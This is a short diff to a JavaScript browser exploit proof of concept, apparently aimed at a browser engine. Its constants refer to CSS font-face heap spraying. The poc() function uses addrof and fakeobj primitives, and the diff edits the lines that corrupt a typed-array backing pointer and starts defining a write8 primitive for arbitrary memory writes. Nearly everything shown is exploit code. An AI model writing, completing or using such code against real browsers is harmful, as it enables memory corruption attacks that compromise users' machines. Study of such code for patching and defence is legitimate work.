@@ -1,5 +1,3 @@
-var PAGE_SIZE = 16384;
-var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
 var SPRAY_FONTS = 0x100a;
@@ -385,9 +383,12 @@ function poc() {
     var expl_slave = new Uint32Array(2);
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
+    obj.buffer = expl_slave;
+    m[7] = 1;
     obj.buffer = expl_master;
     m[4] = addrof_expl_slave;
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+    m[7] = 1;
 
     var prim = {
         write8: function (addr, value) {
